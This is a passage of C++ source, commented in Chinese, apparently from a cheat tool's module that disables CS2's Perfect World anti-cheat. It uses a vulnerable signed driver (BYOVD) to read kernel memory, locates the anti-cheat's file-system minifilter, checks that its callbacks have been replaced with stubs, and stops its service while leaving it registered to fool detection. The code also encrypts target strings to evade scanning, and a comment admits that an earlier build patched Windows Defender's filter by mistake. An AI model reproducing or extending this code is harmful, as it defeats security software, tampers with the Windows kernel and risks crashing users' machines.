    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return true; // BYOVD 未激活时不报错
    // ★ v3.296 FIX-18: CS2 退出后不遍历 FilterList — 防止蓝屏
    //   CS2 关闭时 PAC minifilter 被卸载, FLT_FILTER 结构释放,
    //   遍历 FilterList 会访问已释放的池内存 → BSOD 0x50.
    //   返回 true (视为已中和) — CS2 已退出, 无需中和, 也不应触发 patch.
    if (g_cs2Exited) return true;

    // 检查 fltmgr FilterFindFirst 列表中的 minifilter 是否仍然是 stub
    // 简化为: 检查 fltmgr 内是否有非 stub 的 MessageTransfer 回调
    uint64_t fltmgrBase = 0;
    {
        char fltName[16];
        STEALTH_STR_DECRYPT_TO("fltmgr.sys", fltName, sizeof(fltName));
        fltmgrBase = kma.GetKernelModuleBase(fltName);
        SecureZeroMemory(fltName, sizeof(fltName));
    }
    if (!fltmgrBase) return true;

    uint64_t fltGlobals = FindFltGlobals(fltmgrBase);
    if (!fltGlobals) return true; // 找不到 Globals 不报错

    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 用完立即 SecureZeroMemory 清零
    uint64_t filterAddr = 0;
    {
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        filterAddr = FindFilterByName(fltmgrBase, fltGlobals, pacNameW);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
    }
    if (!filterAddr) {
        // ★ v3.296: 与 NeutralizeMessageTransfer 一致 — 先尝试 FindFilterByStringScan
        wchar_t pacNameW2[256] = {};
        FillPacTargetName(pacNameW2, 256);
        filterAddr = FindFilterByStringScan(fltmgrBase, fltGlobals, pacNameW2);
        SecureZeroMemory(pacNameW2, sizeof(pacNameW2));
    }
    if (!filterAddr) {
        // ★ v3.126p: 精确匹配失败 → 模糊扫描
        wchar_t kernName[256] = {};
        filterAddr = FindPacFilterInKernel(fltmgrBase, fltGlobals, kernName, 256);
        SecureZeroMemory(kernName, sizeof(kernName));  // ★ BUILD 563: 用完清零
    }
    if (!filterAddr) {
        // minifilter 不在列表中 — 被卸载了, 需要重新安装假的存在性
        ByovdDiag("FLT:NTRL:Guard: tgt-filter not found in FilterList!\n");
        return false;
    }

    // 检查 Operations 中的回调是否仍指向 stub
    // ★ BUILD 555 P2-3: 多样化 stub 验证 — 回调可能指向任一 stub 地址
    uint64_t stubAddrs[MAX_STUB_INSTANCES] = {};
    size_t stubCount = 0;
    FindRet0Stubs(fltmgrBase, 0x400000, stubAddrs, MAX_STUB_INSTANCES, &stubCount);
    if (stubCount == 0) return true;  // 无法验证, 不报错

    auto isStubAddr = [&](uint64_t addr) -> bool {
        for (size_t k = 0; k < stubCount; k++) {
            if (stubAddrs[k] == addr) return true;
        }
        return false;
    };

    // ★ BUILD 567 v3.296 FIX: 使用固定偏移 +0x1a8 + MJ 验证 (与 NeutralizeCallbacks 一致)
    //   原 bug: 取第一个内核指针作为 Operations, 会误匹配 FilterUnload/InstanceSetup 等.
    //   真正的 Operations 在 +0x1a8 (Win10/11 x64 标准).
    auto validateOpsArrayGuard = [&](uint64_t val) -> bool {
        if (val <= 0xFFFF800000000000ULL || val >= 0xFFFFFFFFFFFFFFFFULL) return false;
        uint8_t mj = 0;
        uint64_t preOp = 0;
        if (!kma.ReadKernelVA(val, &mj, 1)) return false;
        if (!kma.ReadKernelVA(val + 8, &preOp, 8)) return false;
        if (mj > 0x1B && mj != 0x80) return false;
        if (preOp != 0 && preOp < 0xFFFF800000000000ULL) return false;
        return true;
    };

    uint64_t opsAddr = 0;
    // 1. 优先尝试标准偏移 +0x1a8
    {
        uint64_t val = 0;
        if (kma.ReadKernelVA(filterAddr + 0x1a8, &val, sizeof(val)) && validateOpsArrayGuard(val)) {
            opsAddr = val;
        }
    }
    // 2. 回退: 扫描 0x100-0x400, 每个候选做 MJ 验证
    if (!opsAddr) {
        for (uint64_t off = 0x100; off <= 0x400; off += 8) {
            uint64_t val = 0;
            if (!kma.ReadKernelVA(filterAddr + off, &val, sizeof(val))) continue;
            if (!validateOpsArrayGuard(val)) continue;
            opsAddr = val;
            break;
        }
    }

    if (!opsAddr) return false;

    // ★ v3.126n-review: 修复 — 遍历全部条目到 MJ=0x80, 而非仅前 8 条
    for (int i = 0; i < 64; i++) {
        KernFltOpReg reg = {};
        if (!kma.ReadKernelVA(opsAddr + (uint64_t)(i * sizeof(reg)), &reg, sizeof(reg)))
            break;
        if (reg.MajorFunction == 0x80) break;
        // ★ v3.296 FIX: 验证 MJ 范围 — 防止遍历超出 Operations 数组
        if (reg.MajorFunction > 0x1B) break;
        // ★ BUILD 555 P2-3: 验证回调是否指向任一 stub (多样化场景)
        if ((reg.PreOperation && !isStubAddr(reg.PreOperation)) ||
            (reg.PostOperation && !isStubAddr(reg.PostOperation))) {
            ByovdDiag("FLT:NTRL:Guard: MJ=0x%02X PreOp=0x%llX PostOp=0x%llX not stub!\n",
                (unsigned)reg.MajorFunction,
                (unsigned long long)reg.PreOperation,
                (unsigned long long)reg.PostOperation);
            return false;
        }
    }

    return true; // 全部 stub → 已中和
}

// ============================================================
// ★ v3.126j: PAC (完美世界反作弊) 专用禁用模块
//
// PAC = Perfect Anti-Cheat, 完美世界自研反作弊系统
// 与 EAC 不同, PAC 使用 minifilter (MessageTransfer.sys) 而非 ObRegisterCallbacks
// 检测方式: 扫盘 (文件特征码) + 文件操作拦截 (minifilter) + 人工定罪
//
// 策略:
//   1. 停止 MessageTransfer 服务 (sc stop)
//   2. 卸载 minifilter (FilterUnload via fltlib.dll)
//   3. 删除注册表服务条目
//   4. 删除驱动文件 (完美平台plugin目录 + system32/drivers)
//   5. 周期性守卫 (GuardPac) 检查 PAC 是否恢复
//
// ★ v3.126p: PAC 改名容错 — 不依赖 "MessageTransfer" 硬编码
//   如果 PAC 更新改名 (如 v2.0 改成 "PvpAcFilter"), 自动通过关键词扫描发现
//   策略: 精确匹配 → 模糊扫描 → 最佳匹配
// ============================================================

// ★ v3.126p: PAC 相关关键词 — 用于模糊匹配 PAC 的 minifilter/服务/驱动名
// ★ BUILD 550: 改为运行时解密 — 原 L"messagetransfer" 等明文字符串出现在 .rdata
// ★ BUILD 563: 改为调用方传栈缓冲 (FillPacPatterns) — 原 GetPacPatterns() 内
//   `static wchar_t patterns[8][32]` + `static const wchar_t* patternPtrs[9]` 永久
//   存在于 .data 段, 解密后的 "messagetransfer/pvpac/perfectworld" 等关键词 PAC 可
//   随时扫描发现. 修复: 调用方传栈缓冲, 函数末尾调用方 SecureZeroMemory 清零, 明文
//   窗口从"永久"缩短到"函数执行期间 (~1-10ms)".
//   参数 patterns: 调用方栈缓冲 wchar_t[8][32] (每个关键词 ≤31 字符)
//   参数 patternPtrs: 调用方栈缓冲 const wchar_t*[9] (前 8 项指向 patterns[i], 末尾 nullptr)
static void FillPacPatterns(wchar_t patterns[8][32], const wchar_t* patternPtrs[9]) {
    STEALTH_WSTR_DECRYPT_TO("messagetransfer", patterns[0], 32);  // 当前已知名称 (2024-2026)
    STEALTH_WSTR_DECRYPT_TO("pvpac", patterns[1], 32);            // 常见变体 (PvP Anti-Cheat)
    STEALTH_WSTR_DECRYPT_TO("pw_ac", patterns[2], 32);            // PerfectWorld Anti-Cheat 缩写
    STEALTH_WSTR_DECRYPT_TO("perfectworldac", patterns[3], 32);   // 完整名称
    STEALTH_WSTR_DECRYPT_TO("perfectworld", patterns[4], 32);     // 完美世界
    STEALTH_WSTR_DECRYPT_TO("pwanti", patterns[5], 32);           // PerfectWorld Anti-*
    // ★ v3.296 FIX-20: patterns[6], patterns[7] 保持全零 (空字符串)
    //   BUG: 旧代码 `for (int i = 0; i < 8; i++) patternPtrs[i] = patterns[i]`
    //        把 patternPtrs[6/7] 设为指向空字符串 (不是 nullptr).
    //        IsPacPattern 的子串匹配: while(*a && *b && ...) 不执行 (因为 *b==0),
    //        if (!*b) -> true -> 空模式匹配任何名称!
    //        导致 IsPacPattern("MicrosoftMalwareProtectionAsyncPortWD") 返回 true,
    //        代码错误地把 Defender filter 当作 PAC filter, 修改其回调指针 -> BSOD.
    //   修复: 只设置前 6 个 patternPtrs, patternPtrs[6] = nullptr 终止循环.
    for (int i = 0; i < 6; i++) patternPtrs[i] = patterns[i];
    patternPtrs[6] = nullptr;  // 终止符
    patternPtrs[7] = nullptr;
    patternPtrs[8] = nullptr;
}

// ★ v3.126q: 系统 minifilter 白名单 — 防止模糊匹配误伤 Windows 关键驱动
//   这些是 Windows 内置 minifilter, 永远不可能是 PAC, 匹配到就直接排除
static const wchar_t* g_systemMinifilterExclude[] = {
    L"wof", L"fileinfo", L"cldflt", L"dfsc", L"msfs", L"npfs",
    L"fltmgr", L"bfs", L"bindflt", L"wcifs", L"luafv",
    L"npsvctrig", L"storqosflt", L"iorate", L"fsdepends",
    nullptr
};

static bool IsPacPattern(const wchar_t* name) {
    if (!name || !name[0]) return false;

    // ★ v3.126q: 先检查系统白名单 — 排除 Windows 内置 minifilter
    for (int i = 0; g_systemMinifilterExclude[i]; i++) {
        if (_wcsicmp(name, g_systemMinifilterExclude[i]) == 0)
            return false;
    }

    // 模糊匹配 PAC 模式
    // ★ BUILD 550: 改用 GetPacPatterns() (原 g_pacPatterns 明文已加密)
    // ★ BUILD 563: 改为栈缓冲 (FillPacPatterns), 用完 SecureZeroMemory 清零
    wchar_t patterns[8][32] = {};
    const wchar_t* patternPtrs[9] = {};
    FillPacPatterns(patterns, patternPtrs);
    bool matched = false;
    for (int i = 0; patternPtrs[i]; i++) {
        const wchar_t* p = name;
        while (*p) {
            const wchar_t* a = p, *b = patternPtrs[i];
            while (*a && *b && towlower(*a) == towlower(*b)) { a++; b++; }
            if (!*b) { matched = true; break; }
            p++;
        }
        if (matched) break;
    }
    // ★ BUILD 563: 立即清零, 缩短明文窗口
    SecureZeroMemory(patterns, sizeof(patterns));
    SecureZeroMemory(patternPtrs, sizeof(patternPtrs));
    return matched;
}

// ★ v3.126p: 统一 PAC 目标名获取 — 支持改名容错
// ★ BUILD 497: 固定数组替代 std::wstring — 避免 CRT 堆依赖
// ★ BUILD 535: 移除 LoadLibraryW(fltlib.dll) + FilterFindFirst/Next RPC 调用
//   根因: fltlib.dll 的 FilterFindFirst/Next 是 RPC 客户端 stub, 会触发 rpcrt4.dll
//   创建 RPC worker 线程。worker 线程退出时 LdrShutdownThread → RtlDeactivateActivationContext,
//   在 manual-mapped DLL 上下文中激活上下文栈损坏 → ACCESS_VIOLATION 崩溃
//   (BUILD 534 在 346s 崩溃于 ntdll!RtlDeactivateActivationContext+0x5A2, cmp [rax+0x38],9)
//   修复: 直接使用硬编码 L"MessageTransfer" (项目唯一 PAC 目标, 不改名)
// ★ BUILD 563: 改为调用方传栈缓冲 (FillPacTargetName) — 原 GetPacTargetName() 内
//   `static wchar_t g_cachedPacName[256]` 永久存在于 .data 段, 解密后的
//   "MessageTransfer" PAC 可随时扫描发现. 修复: 调用方传栈缓冲, 调用方在不需要时
//   SecureZeroMemory 清零, 明文窗口从"永久(含30秒缓存)"缩短到"调用方使用期间".
//   取消 30 秒缓存机制 (PAC 名硬编码, 解密成本低; 缓存反而延长明文窗口).
//   参数 buf: 调用方栈缓冲 wchar_t[]
//   参数 bufChars: 缓冲区容量 (wchar_t 个数), 必须 ≥ 16
static void FillPacTargetName(wchar_t* buf, size_t bufChars) {
    if (!buf || bufChars < 16) return;
    // ★ BUILD 535: 直接使用硬编码 PAC 名 — 不再调用 fltlib.dll RPC
    //   项目唯一 PAC 目标是 MessageTransfer.sys (完美世界 CS2 反作弊 minifilter)
    //   历史改名容错已不需要 (MessageTransfer 不会被改名)
    //   fltlib.dll RPC 枚举路径已移除 (参见函数头注释)
    // ★ BUILD 550: 解密 PAC 名 (原 L"MessageTransfer" 明文)
    STEALTH_WSTR_DECRYPT_TO("MessageTransfer", buf, (int)bufChars);
}

// ★ BUILD 563: RefreshPacName 简化为空函数 — 原 RefreshPacName 重置 g_cachedPacName
//   缓存, 但 g_cachedPacName 已删除. 0 处外部调用, 保留空函数定义向后兼容.
static void RefreshPacName() { }

// ★ BUILD 497: 固定缓冲区替代 std::string — 避免 CRT 堆依赖
//   返回 outBuf 中实际写入的字节数
static int WStringToString(const wchar_t* ws, char* outBuf, int outBufSize) {
    if (!ws || !ws[0] || !outBuf || outBufSize <= 0) { if (outBuf) outBuf[0] = 0; return 0; }
    int len = WideCharToMultiByte(CP_ACP, 0, ws, -1, outBuf, outBufSize, nullptr, nullptr);
    if (len <= 0) { outBuf[0] = 0; return 0; }
    return len - 1; // 不包括 null terminator
}

// ★ v3.126p: 内核层模糊扫描 tgt minifilter (用于 Neutralize 失败后的回退)
// ★ BUILD 497: 固定数组替代 std::wstring& — 避免 CRT 堆依赖
static uint64_t FindPacFilterInKernel(uint64_t fltmgrBase, uint64_t fltGlobals, wchar_t* outName, int outNameChars) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;
    // ★ v3.296 FIX-18: 检查 PAC 驱动是否已加载 — 防止 CS2 退出时蓝屏
    //   CS2 退出过程中, PAC minifilter (MessageTransfer.sys) 先被卸载
    //   (FltUnregisterFilter → FLT_FILTER 释放), 但 CS2 进程对象还未完全退出
    //   (GetExitCodeProcess 仍返回 STILL_ACTIVE). 此时遍历 FilterList 会访问
    //   已释放的池内存 → BSOD 0x50.
    //   修复: 如果 MessageTransfer.sys 已从 PsLoadedModuleList 消失,
    //         说明 PAC minifilter 已卸载, 立即返回, 不遍历链表.
    {
        char mtName[32];
        STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
        uint64_t mtBase = kma.GetKernelModuleBase(mtName);
        SecureZeroMemory(mtName, sizeof(mtName));
        if (!mtBase) {
            StateLog("FLT", "KernScanSkip", "reason=PAC driver unloaded");
            ByovdDiag("FLT:KERNSCAN: PAC driver (MessageTransfer.sys) not loaded, skip\n");
            return 0;
        }
    }

    // ★ BUILD 506: 尝试 fltGlobals 前 8 qword 找 FrameList (Win10/Win11 兼容)
    uint64_t globQw[8] = {};
    for (int i = 0; i < 8; i++) {
        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
    }

    uint64_t filterOffsets[] = {
        // ★ v3.296: 新增 0x080-0x180 范围 (Win11 24H2 RegisteredFilters.rList@+0x0a0)
        0x080,0x088,0x090,0x098,0x0a0,0x0a8,0x0b0,0x0b8,
        0x0c0,0x0c8,0x0d0,0x0d8,0x0e0,0x0e8,0x0f0,0x0f8,
        0x100,0x108,0x110,0x118,0x120,0x128,0x130,0x138,
        0x140,0x148,0x150,0x158,0x160,0x168,0x170,0x178,0x180,
        // 保留原 0x188-0x300 范围 (兼容旧版本)
        0x188,0x190,0x198,0x1A0,0x1A8,0x1B0,0x1B8,0x1C0,0x1C8,0x1D0,
        0x1D8,0x1E0,0x1E8,0x1F0,0x1F8,0x200,0x208,0x210,0x218,0x220,
        0x228,0x230,0x238,0x240,0x248,0x250,0x258,0x260,0x268,0x270,
        0x278,0x280,0x288,0x290,0x298,0x2A0,0x2A8,0x2B0,0x2B8,0x2C0,
        0x2C8,0x2D0,0x2D8,0x2E0,0x2E8,0x2F0,0x2F8,0x300 };
    uint64_t filterListHead = 0;

    // 尝试每个 qword 作为 FrameList
    for (int qi = 0; qi < 8 && !filterListHead; qi++) {
        uint64_t frameList = globQw[qi];
        if (frameList < 0xFFFF800000000000ULL) continue;
        uint64_t firstQw = 0;
        if (!kma.ReadKernelVA(frameList, &firstQw, 8)) continue;
        if (firstQw < 0xFFFF800000000000ULL) continue;

        for (uint64_t off : filterOffsets) {
            uint64_t addr = frameList + off;
            uint64_t flink = 0, blink = 0;
            if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
                kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
                if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
                    filterListHead = addr;
                    break;
                }
            }
        }
    }

    // ★ BUILD 506: FrameList 失败 → 外部指针探索 (Win11 FilterList 在池分配中)
    if (!filterListHead) {
        uint8_t fgBuf[0x200] = {};
        if (kma.ReadKernelVA(fltGlobals, fgBuf, sizeof(fgBuf))) {
            for (int off = 0; off < (int)sizeof(fgBuf) - 7 && !filterListHead; off += 8) {
                uint64_t val = *(uint64_t*)(fgBuf + off);
                // ★ BUILD 515: 包含所有内核指针 (包括 fltmgr 范围内的)
                if (val < 0xFFFF800000000000ULL) continue;
                uint64_t flink = 0, blink = 0;
                if (!kma.ReadKernelVA(val, &flink, 8)) continue;
                if (!kma.ReadKernelVA(val + 8, &blink, 8)) continue;
                if (flink == val) continue;
                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;
                // 验证: 遍历链表看是否有命名过滤器
                uint64_t cur = flink;
                for (int iter = 0; iter < 100 && cur && cur != val; iter++) {
                    // ★ BUILD 519: 尝试多个 ActiveLink 偏移
                    uint64_t alOffs[] = { 0x008, 0x010, 0x018, 0x020, 0x028, 0x030 };
                    for (int ali = 0; ali < 6; ali++) {
                        uint64_t fBase = cur - alOffs[ali];
                        for (uint64_t no = 0x38; no <= 0x300; no += 8) {
                            uint16_t nl = 0; uint64_t nb = 0;
                            if (kma.ReadKernelVA(fBase + no, &nl, sizeof(nl)) &&
                                kma.ReadKernelVA(fBase + no + 8, &nb, sizeof(nb))) {
                                if (nl > 0 && nl <= 256 && nl % 2 == 0 &&
                                    nb >= 0xFFFF800000000000ULL && nb < 0xFFFFFD0000000000ULL) {
                                    filterListHead = val;
                                    goto EXT_FOUND_PAC;
                                }
                            }
                        }
                    }
                    // ★ v3.296 FIX-18: 验证 cur 在白名单范围内
                    if (cur >= 0xFFFFFD0000000000ULL) break;
                    if (!kma.ReadKernelVA(cur, &cur, 8)) break;
                }
                EXT_FOUND_PAC:;
            }
        }
    }
    if (!filterListHead) return 0;

    // ★ v3.296 FIX-17 DIAG: 记录 filterListHead 找到
    StateLog("FLT", "KernScanListHead", "addr=0x%llX", (unsigned long long)filterListHead);

    // ★ BUILD 513: 扩展 name offset 搜索 (仅 0x008 ActiveLink, 已验证正确)
    uint64_t nameOffsetsFull[] = {
        0x000, 0x008, 0x010, 0x018, 0x020, 0x028, 0x030,
        0x038, 0x040, 0x048, 0x058, 0x068, 0x078,
        0x088, 0x098, 0x0A8, 0x0B8, 0x0C8, 0x0D8,
        0x0E8, 0x0F8, 0x108, 0x118, 0x128, 0x138,
        0x148, 0x158, 0x168, 0x178, 0x188, 0x198,
        0x1A8, 0x1B8, 0x1C8, 0x1D8, 0x1E8, 0x1F8,
        0x208, 0x218, 0x228, 0x238, 0x248, 0x258,
        0x268, 0x278, 0x288, 0x298, 0x2A8, 0x2B8,
        0x2C8, 0x2D8, 0x2E8, 0x2F8, 0x300,
        0x308, 0x318, 0x328, 0x338, 0x348, 0x358,
        0x368, 0x378, 0x388, 0x398, 0x3A8, 0x3B8,
        0x3C8, 0x3D8, 0x3E8, 0x3F8, 0x400,
        // ★ BUILD 522: 扩大到 0x800 — Win11 FLT_FILTER 结构更大
        0x408, 0x418, 0x428, 0x438, 0x448, 0x458,
        0x468, 0x478, 0x488, 0x498, 0x4A8, 0x4B8,
        0x4C8, 0x4D8, 0x4E8, 0x4F8, 0x500,
        0x508, 0x518, 0x528, 0x538, 0x548, 0x558,
        0x568, 0x578, 0x588, 0x598, 0x5A8, 0x5B8,
        0x5C8, 0x5D8, 0x5E8, 0x5F8, 0x600,
        0x608, 0x618, 0x628, 0x638, 0x648, 0x658,
        0x668, 0x678, 0x688, 0x698, 0x6A8, 0x6B8,
        0x6C8, 0x6D8, 0x6E8, 0x6F8, 0x700,
        0x708, 0x718, 0x728, 0x738, 0x748, 0x758,
        0x768, 0x778, 0x788, 0x798, 0x7A8, 0x7B8,
        0x7C8, 0x7D8, 0x7E8, 0x7F8, 0x800,
    };

    uint64_t current = 0;
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current))) return 0;

    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
        // ★ BUILD 520: 尝试多个 ActiveLink 偏移, 只有非空名称才算有效
        uint64_t activeLinkOffsets[] = { 0x010, 0x008, 0x018, 0x020, 0x028, 0x030 };

        bool nameDumped = false;
        for (uint64_t alOff : activeLinkOffsets) {
            uint64_t filterBase = current - alOff;
            for (uint64_t nameOff : nameOffsetsFull) {
                uint16_t nameLen = 0;
                uint64_t nameBuf = 0;
                if (kma.ReadKernelVA(filterBase + nameOff, &nameLen, sizeof(nameLen)) &&
                    kma.ReadKernelVA(filterBase + nameOff + 8, &nameBuf, sizeof(nameBuf))) {
                    if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
                        nameBuf >= 0xFFFF800000000000ULL && nameBuf < 0xFFFFFD0000000000ULL) {
                        wchar_t filterName[256] = {};
                        int nchars = ReadKernelUnicodeString(nameBuf, nameLen, filterName, 256);
                        // ★ BUILD 521: 严格验证 — minifilter 名称必须以字母开头
                        wchar_t c0 = filterName[0];
                        bool isAlpha = (c0 >= L'A' && c0 <= L'Z') || (c0 >= L'a' && c0 <= L'z');
                        // ★ v3.296 FIX-17 DIAG: dump 所有 filter 名称 (第一个 alOff + 第一个有效 nameOff)
                        if (nchars > 0 && isAlpha && !nameDumped) {
                            StateLog("FLT", "KernScanFilter",
                                     "iter=%d filter=0x%llX alOff=0x%llX noff=0x%llX name='%ls'",
                                     iter, (unsigned long long)filterBase,
                                     (unsigned long long)alOff,
                                     (unsigned long long)nameOff, filterName);
                            nameDumped = true;
                        }
                        if (nchars > 0 && isAlpha && IsPacPattern(filterName)) {
                            if (outName && outNameChars > 0) {
                                wcsncpy_s(outName, outNameChars, filterName, (size_t)(outNameChars - 1));
                            }
                            StateLog("FLT", "KernScanFound",
                                     "filter=0x%llX name='%ls'",
                                     (unsigned long long)filterBase, filterName);
                            ByovdDiag("FLT:NTRL: FindFltInKern B520: found '%ls' at 0x%llX (alOff=0x%llX nameOff=0x%llX)\n",
                                filterName, (unsigned long long)filterBase, alOff, nameOff);
                            return filterBase;
                        }
                    }
                }
            }
        }

        // ★ v3.296 FIX-18: 验证 current 在白名单范围内 — 防止访问已释放内存
        if (current >= 0xFFFFFD0000000000ULL) {
            StateLog("FLT", "KernScanListBreak",
                     "iter=%d current=0x%llX reason=out_of_whitelist",
                     iter, (unsigned long long)current);
            break;
        }
        if (!kma.ReadKernelVA(current, &current, sizeof(current))) {
            StateLog("FLT", "KernScanListBreak",
                     "iter=%d current=0x%llX reason=readfail",
                     iter, (unsigned long long)current);
            break;
        }
    }

    // ★ v3.296 FIX-17 DIAG: 记录扫描完成但未找到
    StateLog("FLT", "KernScanNoFilter", "filterListHead=0x%llX", (unsigned long long)filterListHead);

    // ★ BUILD 514: 移除回调范围回退 — PDFWKRNL.sys memcpy 不验证地址, 从不可信 opsPtr 读取会 BSOD
    return 0;
}

// ★ BUILD 535: fltlib.dll RPC 函数全部废弃 — 与 GetPacTargetName 同根因
//   (rpcrt4 worker 线程退出 → RtlDeactivateActivationContext → 激活上下文栈损坏 → 崩溃)
//   IsPacMinifilterLoaded / UnloadPacMinifilter 当前无调用者 (GuardPac 已 #if 0, DisablePac 已注释)
//   保留定义以备未来参考, 但必须先解决 manual-mapped DLL 激活上下文问题才能启用
#if 0
// 动态加载 fltlib.dll 的 FilterUnload 函数 (无需 WDK)
typedef HRESULT (WINAPI* _FilterUnload)(LPCWSTR lpFilterName);
// ★ v3.126l: FilterFindFirst/FilterFindNext — 枚举已加载 minifilter
typedef HRESULT (WINAPI* _FilterFindFirst)(
    DWORD dwInformationClass, LPVOID lpBuffer, DWORD dwBufferSize,
    LPDWORD lpBytesReturned, LPDWORD lpFilterFind);
typedef HRESULT (WINAPI* _FilterFindNext)(
    DWORD dwFilterFind, DWORD dwInformationClass, LPVOID lpBuffer,
    DWORD dwBufferSize, LPDWORD lpBytesReturned);
typedef HRESULT (WINAPI* _FilterFindClose)(DWORD dwFilterFind);

// ★ v3.126l: 检查 MessageTransfer minifilter 是否已加载
//   不依赖 SCM 服务状态, 直接查询 Filter Manager
static bool IsPacMinifilterLoaded() {
    HMODULE hFltLib = LoadLibraryW(L"fltlib.dll");
    if (!hFltLib) return false;

    _FilterFindFirst pFindFirst = (_FilterFindFirst)STEALTH_GET_PROC_ADDRESS_NOREF(hFltLib, "FilterFindFirst");
    _FilterFindNext  pFindNext  = (_FilterFindNext)STEALTH_GET_PROC_ADDRESS_NOREF(hFltLib, "FilterFindNext");
    _FilterFindClose pFindClose = (_FilterFindClose)STEALTH_GET_PROC_ADDRESS_NOREF(hFltLib, "FilterFindClose");

    if (!pFindFirst || !pFindNext || !pFindClose) {
        FreeLibrary(hFltLib);
        return false;
    }

    // FILTER_FULL_INFORMATION = 0 (enumerates by filter name)
    wchar_t buf[512] = {};
    DWORD bytesReturned = 0;
    DWORD filterFind = 0;
    HRESULT hr = pFindFirst(0, buf, sizeof(buf), &bytesReturned, &filterFind);
    if (FAILED(hr)) {
        FreeLibrary(hFltLib);
        return false;
    }

    bool found = false;
    do {
        auto* info = (BYTE*)buf;
        // FILTER_FULL_INFORMATION: Name is at offset 8 (wchar_t[256])
        const wchar_t* filterName = (const wchar_t*)(info + 8);
        // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), #if 0 内代码不参与编译,
        //   但保持一致性以备未来恢复时不需要再修改
        wchar_t pacNameW[256] = {};
        FillPacTargetName(pacNameW, 256);
        if (_wcsicmp(filterName, pacNameW) == 0) {
            found = true;
            SecureZeroMemory(pacNameW, sizeof(pacNameW));
            break;
        }
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
        bytesReturned = 0;
        hr = pFindNext(filterFind, 0, buf, sizeof(buf), &bytesReturned);
    } while (SUCCEEDED(hr));

    pFindClose(filterFind);
    FreeLibrary(hFltLib);
    return found;
}
#endif // BUILD 535: IsPacMinifilterLoaded 废弃

static bool DisablePacService() {
    ByovdDiag("B550:PC:DPS: opening SCM...\n");

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) {
        ByovdDiag("B550:PC: OpenSCManager failed (err=%u)\n", GetLastError());
        return false;
    }

    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 用完 SecureZeroMemory 清零
    //   pacName 仅在 OpenServiceW 和 ByovdDiag 中使用, 用完即清零
    wchar_t pacNameW[256] = {};
    FillPacTargetName(pacNameW, 256);
    // ★ BUILD 507: 仅停止服务, 不删除 — 保留服务注册项让 CS2 检测通过
    SC_HANDLE svc = OpenServiceW(scm, pacNameW,
        SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!svc) {
        ByovdDiag("B550:PC: SCM service '%ls' not found\n", pacNameW);
        SecureZeroMemory(pacNameW, sizeof(pacNameW));
        CloseServiceHandle(scm);
        return true; // 未找到 = 可能已经卸载, 不算失败
    }
    SecureZeroMemory(pacNameW, sizeof(pacNameW));  // ★ BUILD 563: OpenServiceW 后立即清零

    // 查询状态
    SERVICE_STATUS_PROCESS ssp = {};
    DWORD bytesNeeded = 0;
    if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        ByovdDiag("B550:PC: service state=%u\n", ssp.dwCurrentState);
        if (ssp.dwCurrentState == SERVICE_RUNNING) {
            // 发送停止命令
            SERVICE_STATUS stopStatus = {};
            if (ControlService(svc, SERVICE_CONTROL_STOP, &stopStatus)) {
                ByovdDiag("B550:PC: STOP signal sent\n");
                // 等待最多 3 秒
                for (int i = 0; i < 15; i++) {
                    Sleep(200);
                    QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded);
                    if (ssp.dwCurrentState == SERVICE_STOPPED) break;
                }
                ByovdDiag("B550:PC: final state=%u\n", ssp.dwCurrentState);
            } else {
                DWORD err = GetLastError();
                ByovdDiag("B550:PC: ControlService(STOP) failed (err=%u)\n", err);
                // 错误 1062 (服务未启动) 不算失败
                if (err != 1062) {
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }
        }
    }

    // ★ BUILD 507: 只停止服务, 不删除 (保留注册项让 CS2 检测通过)
    ByovdDiag("B550:PC: service stopped (kept registered for CS2 detection)\n");

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return true;
}

#if 0 // BUILD 535: UnloadPacMinifilter 废弃 (fltlib.dll RPC, 与 GetPacTargetName 同根因)
static bool UnloadPacMinifilter() {
    // 动态加载 fltlib.dll → FilterUnload
    HMODULE hFltLib = LoadLibraryW(L"fltlib.dll");
    if (!hFltLib) {
        ByovdDiag("B550:PC: fltlib.dll not available\n");
        return false;
    }

    _FilterUnload pFilterUnload = (_FilterUnload)STEALTH_GET_PROC_ADDRESS_NOREF(hFltLib, "FilterUnload");
    if (!pFilterUnload) {
        ByovdDiag("B550:PC: FilterUnload not exported\n");
        FreeLibrary(hFltLib);
        return false;
    }

    // ★ BUILD 563: 改为栈缓冲 (FillPacTargetName), 用完 SecureZeroMemory 清零
    //   #if 0 内代码不参与编译, 但保持一致性以备未来恢复
    wchar_t pacNameW[256] = {};
    FillPacTargetName(pacNameW, 256);
    HRESULT hr = pFilterUnload(pacNameW);
    SecureZeroMemory(pacNameW, sizeof(pacNameW));
    FreeLibrary(hFltLib);

    if (SUCCEEDED(hr)) {
        ByovdDiag("B550:PC: minifilter unloaded OK\n");
        return true;
    } else {
        // 0x801F0010 = 未找到过滤器 (可能已卸载)
        // 0x801F000F = 过滤器有活动实例但正在卸载
        ByovdDiag("B550:PC: FilterUnload returned 0x%08X (may already be unloaded)\n", (unsigned)hr);
        return (hr == 0x801F0010 || hr == 0x801F000F); // 不算失败
